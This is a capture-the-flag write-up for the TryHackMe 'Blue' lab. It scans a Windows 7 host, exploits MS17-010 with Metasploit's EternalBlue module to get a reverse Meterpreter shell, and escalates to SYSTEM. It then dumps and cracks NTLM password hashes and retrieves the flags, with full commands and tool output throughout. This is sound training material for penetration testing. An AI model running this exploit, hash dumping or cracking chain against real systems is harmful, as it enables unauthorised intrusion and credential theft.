# Blue - Writeup

    Box IP Addresses:
    10.10.218.248
    10.10.249.194

## [Task 1] Recon

### 1 Scan the machine. (If you are unsure how to tackle this, I recommend checking out the room RP: Nmap)

    ─[✗]─[user@parrot]─[~/labs/tryhackme/blue]
    └──╼ $sudo nmap -sC -sV -oA nmap 10.10.218.248

    Nmap scan report for 10.10.218.248
    Host is up (0.13s latency).
    Not shown: 991 closed ports
    PORT      STATE SERVICE            VERSION
    135/tcp   open  msrpc              Microsoft Windows RPC
    139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
    3389/tcp  open  ssl/ms-wbt-server?
    49152/tcp open  msrpc              Microsoft Windows RPC
    49153/tcp open  msrpc              Microsoft Windows RPC
    49154/tcp open  msrpc              Microsoft Windows RPC
    49158/tcp open  msrpc              Microsoft Windows RPC
    49160/tcp open  msrpc              Microsoft Windows RPC
    Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    |_clock-skew: mean: 1h40m01s, deviation: 2h53m12s, median: 0s
    |_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:03:a1:b9:23:98 (unknown)
    | smb-os-discovery:
    |   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
    |   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
    |   Computer name: Jon-PC
    |   NetBIOS computer name: JON-PC\x00
    |   Workgroup: WORKGROUP\x00
    |_  System time: 2020-07-24T20:22:57-05:00
    | smb-security-mode:
    |   account_used: <blank>
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    | smb2-security-mode:
    |   2.02:
    |_    Message signing enabled but not required
    | smb2-time:
    |   date: 2020-07-25T01:22:57
    |_  start_date: 2020-07-25T01:04:33

### 2 How many ports are open with a port number under 1000?

3 (see above).

### 3 What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)

We can run nmap again with a vulnerability script:

    sudo nmap -vv -sS --script vuln 10.10.218.248

    Nmap scan report for 10.10.218.248
    Host is up, received echo-reply ttl 127 (0.12s latency).
    Scanned at 2020-07-25 02:33:08 BST for 97s
    Not shown: 991 closed ports
    Reason: 991 resets
    PORT      STATE SERVICE       REASON
    135/tcp   open  msrpc         syn-ack ttl 127
    |_clamav-exec: ERROR: Script execution failed (use -d to debug)
    139/tcp   open  netbios-ssn   syn-ack ttl 127
    |_clamav-exec: ERROR: Script execution failed (use -d to debug)
    445/tcp   open  microsoft-ds  syn-ack ttl 127
    |_clamav-exec: ERROR: Script execution failed (use -d to debug)
    3389/tcp  open  ms-wbt-server syn-ack ttl 127
    |_clamav-exec: ERROR: Script execution failed (use -d to debug)
    |_ssl-ccs-injection: No reply from server (TIMEOUT)
    |_sslv2-drown:
    49152/tcp open  unknown       syn-ack ttl 127
    |_clamav-exec: ERROR: Script execution failed (use -d to debug)
    49153/tcp open  unknown       syn-ack ttl 127
    |_clamav-exec: ERROR: Script execution failed (use -d to debug)
    49154/tcp open  unknown       syn-ack ttl 127
    |_clamav-exec: ERROR: Script execution failed (use -d to debug)
    49158/tcp open  unknown       syn-ack ttl 127
    |_clamav-exec: ERROR: Script execution failed (use -d to debug)
    49160/tcp open  unknown       syn-ack ttl 127
    |_clamav-exec: ERROR: Script execution failed (use -d to debug)

    Host script results:
    |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
    |_smb-vuln-ms10-054: false
    |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
    | smb-vuln-ms17-010:
    |   VULNERABLE:
    |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
    |     State: VULNERABLE
    |     IDs:  CVE:CVE-2017-0143
    |     Risk factor: HIGH
    |       A critical remote code execution vulnerability exists in Microsoft SMBv1
    |        servers (ms17-010).
    |           
    |     Disclosure date: 2017-03-14
    |     References:
    |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
    |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
    |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

    NSE: Script Post-scanning.
    NSE: Starting runlevel 1 (of 2) scan.
    Initiating NSE at 02:34
    Completed NSE at 02:34, 0.00s elapsed
    NSE: Starting runlevel 2 (of 2) scan.
    Initiating NSE at 02:34
    Completed NSE at 02:34, 0.00s elapsed
    Read data files from: /usr/bin/../share/nmap
    Nmap done: 1 IP address (1 host up) scanned in 131.83 seconds
    Raw packets sent: 1402 (61.664KB) | Rcvd: 1006 (40.264KB)

We can see that it is vulnerable to ms17-010.

## [Task 2] Gain Access

### 1 Start Metasploit

Just type in:

    $ msfconsole

### 2 Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)

    search ms17-010

    msf5 > search ms17-010

    Matching Modules
    ================

    #  Name                                           Disclosure Date  Rank     Check  Description
     -  ----                                           ---------------  ----     -----  -----------
     0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
     1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
     2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
     3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
     4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
     5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution

We are going to be using exploit/windows/smb/ms17_010_eternalblue.

    msf5 > use 2

### 3 Show options and set the one required value. What is the name of this value? (All caps for submission)

    msf5 exploit(windows/smb/ms17_010_eternalblue) > options

    set rhosts 10.10.218.248
    set lhosts 10.8.82.167

Value: RHOSTS

### 4 Run the exploit!

    msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit

    [*] Started reverse TCP handler on 10.8.82.167:4444
    [*] 10.10.249.194:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
    [+] 10.10.249.194:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
    [*] 10.10.249.194:445     - Scanned 1 of 1 hosts (100% complete)
    [*] 10.10.249.194:445 - Connecting to target for exploitation.
    [+] 10.10.249.194:445 - Connection established for exploitation.
    [+] 10.10.249.194:445 - Target OS selected valid for OS indicated by SMB reply
    [*] 10.10.249.194:445 - CORE raw buffer dump (42 bytes)
    [*] 10.10.249.194:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
    [*] 10.10.249.194:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
    [*] 10.10.249.194:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
    [+] 10.10.249.194:445 - Target arch selected valid for arch indicated by DCE/RPC reply
    [*] 10.10.249.194:445 - Trying exploit with 12 Groom Allocations.
    [*] 10.10.249.194:445 - Sending all but last fragment of exploit packet
    [*] 10.10.249.194:445 - Starting non-paged pool grooming
    [+] 10.10.249.194:445 - Sending SMBv2 buffers
    [+] 10.10.249.194:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
    [*] 10.10.249.194:445 - Sending final SMBv2 buffers.
    [*] 10.10.249.194:445 - Sending last fragment of exploit packet!
    [*] 10.10.249.194:445 - Receiving response from exploit packet
    [+] 10.10.249.194:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
    [*] 10.10.249.194:445 - Sending egg to corrupted connection.
    [*] 10.10.249.194:445 - Triggering free of corrupted buffer.
    [*] Sending stage (201283 bytes) to 10.10.249.194
    [*] Meterpreter session 1 opened (10.8.82.167:4444 -> 10.10.249.194:49169) at 2020-07-25 04:42:05 +0100
    [+] 10.10.249.194:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
    [+] 10.10.249.194:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
    [+] 10.10.249.194:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

    meterpreter > shell


### 5 Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.


## [Task 3] Escalate

### [Task 3] Escalate

Escalate privileges, learn how to upgrade shells in metasploit.

### 1 If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)

I didn't need to do this because it automtically took me to a meterpreter shell. The way to do this though is:

CTRL+Z to background the shell.
use post/multi/manage/shell_to_meterpreter
set session 1
run

and it will escalate the current shell to a Meterpreter shell.

### 2 Select this (use MODULE_PATH). Show options, what option are we required to change? (All caps for answer)

SESSION.

### 3 Set the required option, you may need to list all of the sessions to find your target here.

### 4 Run! If this doesn't work, try completing the exploit from the previous task once more.

### 5 Once the meterpreter shell conversion completes, select that session for use.

### 6 Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.

If you run `getuid` you'll get the same info:

    meterpreter > sysinfo
    Computer        : JON-PC
    OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
    Architecture    : x64
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 0
    Meterpreter     : x64/windows

    meterpreter > getuid
    Server username: NT AUTHORITY\SYSTEM

### 7 List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).

    meterpreter > ps

    Process List
    ============

     PID   PPID  Name                  Arch  Session  User                          Path
     ---   ----  ----                  ----  -------  ----                          ----
     0     0     [System Process]                                                   
     4     0     System                x64   0                                      
     416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
     432   708   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
     492   708   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
     560   552   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
     612   552   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
     620   600   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
     660   600   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
     708   612   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
     716   612   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
     724   612   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
     832   708   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
     900   708   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
     948   708   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
     1016  660   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
     1080  708   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
     1180  708   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
     1312  708   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
     1348  708   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
     1412  708   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
     1432  1312  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\cmd.exe
     1484  708   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
     1628  708   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
     1952  708   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
     2068  2676  mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
     2072  832   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\wbem\wmiprvse.exe
     2200  560   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
     2592  1312  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\cmd.exe
     2600  560   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
     2676  708   mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
     2712  708   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
     2744  708   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\sppsvc.exe
     2780  708   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
     2880  708   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\SearchIndexer.exe

     meterpreter > migrate 2780
     [*] Migrating from 1312 to 2780...
     [*] Migration completed successfully.


### 8 Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.


## [Task 4] Cracking

Dump the non-default user's password and crack it!

### 1 Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?

    meterpreter > hashdump
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

Name of the non-default user = Jon.

### 2 Copy this password hash to a file and research how to crack it. What is the cracked password?

Copying it into the file, we can see how each credential is formed:

USER : RELATIVE IDENTIFIER : LM Hash : NT Hash

More info here:
[1. adshotgyan](http://www.adshotgyan.com/2012/02/lm-hash-and-nt-hash.html)

We can get rid of everything but the NT hash. This will allow us to crack the NT hash with Hashcat (which I couldn't run on my VM, so I used an online hash cracker) to give me:

Jon:alqfna22

From: https://breakbeforemake.tech/13656/tryhackme-blue
To actually ID the hash, you would:

1. Run it in hashid

    meterpreter> hashid -m < pass

2. Crack with Hashcat

    hashcat -m 1000 -a 0 `cat ntlm.txt` /usr/share/wordlists/rockyou.txt --force -o cracked.txt

## [Task 5] Find flags!

Find the three flags planted on this machine.
-----------------------------------------------------------------

    meterpreter > search -f *flag*
    Found 24 results...
    c:\Documents and Settings\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag1.lnk (482 bytes)
    c:\Documents and Settings\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag2.lnk (848 bytes)
    c:\Documents and Settings\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag3.lnk (2344 bytes)
    c:\Documents and Settings\Jon\Application Data\Microsoft\Windows\Recent\flag1.lnk (482 bytes)
    c:\Documents and Settings\Jon\Application Data\Microsoft\Windows\Recent\flag2.lnk (848 bytes)
    c:\Documents and Settings\Jon\Application Data\Microsoft\Windows\Recent\flag3.lnk (2344 bytes)
    c:\Documents and Settings\Jon\Documents\flag3.txt (37 bytes)
    c:\Documents and Settings\Jon\My Documents\flag3.txt (37 bytes)
    c:\Documents and Settings\Jon\Recent\flag1.lnk (482 bytes)
    c:\Documents and Settings\Jon\Recent\flag2.lnk (848 bytes)
    c:\Documents and Settings\Jon\Recent\flag3.lnk (2344 bytes)
    c:\flag1.txt (24 bytes)
    c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag1.lnk (482 bytes)
    c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag2.lnk (848 bytes)
    c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag3.lnk (2344 bytes)
    c:\Users\Jon\Application Data\Microsoft\Windows\Recent\flag1.lnk (482 bytes)
    c:\Users\Jon\Application Data\Microsoft\Windows\Recent\flag2.lnk (848 bytes)
    c:\Users\Jon\Application Data\Microsoft\Windows\Recent\flag3.lnk (2344 bytes)
    c:\Users\Jon\Documents\flag3.txt (37 bytes)
    c:\Users\Jon\My Documents\flag3.txt (37 bytes)
    c:\Users\Jon\Recent\flag1.lnk (482 bytes)
    c:\Users\Jon\Recent\flag2.lnk (848 bytes)
    c:\Users\Jon\Recent\flag3.lnk (2344 bytes)
    c:\Windows\System32\config\flag2.txt (34 bytes)

### 1 Flag1? (Only submit the flag contents {CONTENTS})

```
    meterpreter > download c:\\flag1.txt
    [*] Downloading: c:\flag1.txt -> flag1.txt
    [*] Downloaded 24.00 B of 24.00 B (100.0%): c:\flag1.txt -> flag1.txt
    [*] download   : c:\flag1.txt -> flag1.txt
```
FLAG: flag{access_the_machine}

### 2 Flag2? Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.

```
meterpreter > download c:\\Windows\\System32\\config\\flag2.txt
[*] Downloading: c:\Windows\System32\config\flag2.txt -> flag2.txt
[*] Downloaded 34.00 B of 34.00 B (100.0%): c:\Windows\System32\config\flag2.txt -> flag2.txt
[*] download   : c:\Windows\System32\config\flag2.txt -> flag2.txt
```

FLAG: flag{sam_database_elevated_access}

### 3 Flag3?

```
meterpreter > download c:\\Users\\Jon\\Documents\\flag3.txt
[*] Downloading: c:\Users\Jon\Documents\flag3.txt -> flag3.txt
[*] Downloaded 37.00 B of 37.00 B (100.0%): c:\Users\Jon\Documents\flag3.txt -> flag3.txt
[*] download   : c:\Users\Jon\Documents\flag3.txt -> flag3.txt
```

FLAG: flag{admin_documents_can_be_valuable}
